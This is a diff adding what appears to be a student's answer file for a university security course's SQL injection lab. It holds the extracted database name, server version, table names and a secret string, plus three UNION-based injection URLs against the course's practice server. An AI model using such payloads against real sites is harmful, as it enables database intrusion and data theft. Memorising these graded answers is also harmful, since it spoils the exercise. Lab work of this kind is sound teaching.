@@ -1,0 +1,10 @@
+proj2_inject3
+8.0.30-0ubuntu0.22.04.1
+HINT,SECRET,foo,inject3_users
+A_SECRET_STRING
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CDATABASE%28%29%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2Cversion%28%29%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL%2CGROUP_CONCAT%28TABLE_NAME%29+FROM+information_schema.TABLES+WHERE+table_schema%3D%27proj2_inject3%27%3B+--+
+http://URL_FOR_PROBLEM_4
+http://ANOTHER_URL_FOR_PROBLEM_4
